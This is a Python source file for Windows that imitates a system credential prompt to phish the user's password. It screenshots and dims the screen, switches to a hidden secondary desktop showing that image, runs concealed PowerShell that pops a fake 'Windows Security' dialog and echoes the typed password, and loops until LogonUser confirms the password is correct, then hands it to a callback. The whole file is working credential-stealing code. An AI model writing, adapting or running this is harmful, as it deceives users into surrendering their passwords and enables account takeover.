import locale
import os
import threading
import time
from tkinter import Tk, PhotoImage, Label

import pyautogui
import win32con
import win32file
import win32pipe
import win32process
import win32security
import win32service
import winerror
from PIL import Image, ImageEnhance

filename = os.path.join(os.environ['LOCALAPPDATA'], 'test.png')

global handle_desktop


def create_background_window():
    global handle_desktop
    handle_desktop.SetThreadDesktop()
    tk = Tk()
    tk.attributes('-fullscreen', True)
    photo_image = PhotoImage(file=filename)
    label = Label(tk, image=photo_image)
    label.pack()
    tk.mainloop()


def create_process():
    cmd1 = ' $cred=$host.ui.promptforcredential(\'Windows Security\',\'\',[Environment]::Username,' \
           '[Environment]::UserDomainName); '
    cmd2 = 'echo $cred.getnetworkcredential().password;'
    security_attributes = win32security.SECURITY_ATTRIBUTES()
    security_attributes.bInheritHandle = True
    stdout_r, stdout_w = win32pipe.CreatePipe(security_attributes, 0)
    startup_info = win32process.STARTUPINFO()
    startup_info.lpDesktop = 'test'
    startup_info.dwFlags = win32con.STARTF_USESTDHANDLES | win32con.STARTF_USESHOWWINDOW
    startup_info.wShowWindow = win32con.SW_HIDE
    startup_info.hStdOutput = stdout_w
    win32process.CreateProcess(
        r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe',
        cmd1 + cmd2,
        None,
        None,
        True,
        win32con.CREATE_NEW_CONSOLE,
        None,
        None,
        startup_info
    )
    output = win32file.ReadFile(stdout_r, 1024)
    return output[1].decode(locale.getdefaultlocale()[1]).strip()


def logon_user(username, password):
    try:
        token = win32security.LogonUser(username, None, password, win32security.LOGON32_LOGON_INTERACTIVE,
                                        win32security.LOGON32_PROVIDER_DEFAULT)
        token.Close()
        return True
    except win32security.error as e:
        if e.winerror == winerror.ERROR_ACCOUNT_RESTRICTION:
            return True
        if e.winerror == winerror.ERROR_LOGON_FAILURE:
            return False
        return False


def switch_desktop(func):
    pyautogui.screenshot(filename)
    image = Image.open(filename)
    enhancer = ImageEnhance.Brightness(image)
    image = enhancer.enhance(0.5)
    image.save(filename)
    global handle_desktop
    handle_desktop = win32service.CreateDesktop('test', 0, win32con.MAXIMUM_ALLOWED, None)
    threading.Thread(target=create_background_window, daemon=True).start()
    time.sleep(1)
    handle_desktop.SwitchDesktop()
    username = os.getlogin()
    while True:
        password = create_process()
        if logon_user(username, password):
            func(password)
            break
    handle_desktop_default = win32service.OpenDesktop('default', 0, False,
                                                      win32con.READ_CONTROL | win32con.DESKTOP_SWITCHDESKTOP)
    handle_desktop_default.SwitchDesktop()
